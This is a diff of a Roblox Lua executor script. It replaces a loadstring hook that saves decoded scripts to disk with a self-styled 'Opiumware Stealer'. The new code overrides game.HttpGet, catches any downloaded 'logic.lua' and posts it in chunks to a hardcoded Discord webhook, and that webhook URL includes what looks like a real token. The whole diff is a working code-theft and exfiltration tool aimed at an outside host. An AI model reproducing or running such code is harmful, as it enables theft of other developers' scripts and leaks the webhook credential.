@@ -1,32 +1,34 @@
-local real_loadstring = loadstring
-local real_load = load
+local webhook = "Yhttps://discord.com/api/webhooks/1554824730295537748/tGtbX0XaBJwGoI-dDfVhQFLna4qSzFCa8tvli7BW4FogXZP5Bn-SS8SuEYfTbIS9WboH"
 
-local function capture(src, chunkname)
-    if type(src) == "string" and #src > 500 then
-        local filename = "DECODED_" .. tostring(math.random(1000,9999)) .. ".lua"
-        if writefile then
-            writefile(filename, src)
-            print("=== SAVED TO WORKSPACE: " .. filename .. " ===")
+local function sendToDiscord(content)
+    local payload = {
+        ["content"] = content,
+        ["username"] = "Opiumware Stealer"
+    }
+    local request = http and http.request or syn and syn.request or request
+    if request then
+        request({
+            Url = webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = game:GetService("HttpService"):JSONEncode(payload)
+        })
+    end
+end
+
+-- Intercept the download and send it to Discord
+local oldHttpGet = game.HttpGet
+game.HttpGet = function(self, url, ...)
+    local res = oldHttpGet(self, url, ...)
+    if string.find(url, "logic.lua") then
+        sendToDiscord("Found Logic! Length: " .. #res)
+        -- Split into 1900 character chunks so Discord doesn't reject it
+        for i = 1, #res, 1900 do
+            local chunk = string.sub(res, i, i + 1899)
+            sendToDiscord("```lua\n" .. chunk .. "\n```")
+            task.wait(1)
         end
     end
-    return real_loadstring(src, chunkname)
+    return res
 end
-
-loadstring = capture
-load = capture
-if hookfunction and getrawmetatable then
-    pcall(function()
-        local mt = getrawmetatable(game)
-        local old = mt.__index
-        setreadonly(mt, false)
-        mt.__index = function(t, k)
-            if k == "loadstring" or k == "load" then
-                return capture
-            end
-            return old(t, k)
-        end
-        setreadonly(mt, true)
-    end)
-end
-
-print("[HOOK] Waiting for the Chocola script to load...")
+print("Proxy active. Waiting for logic.lua...")
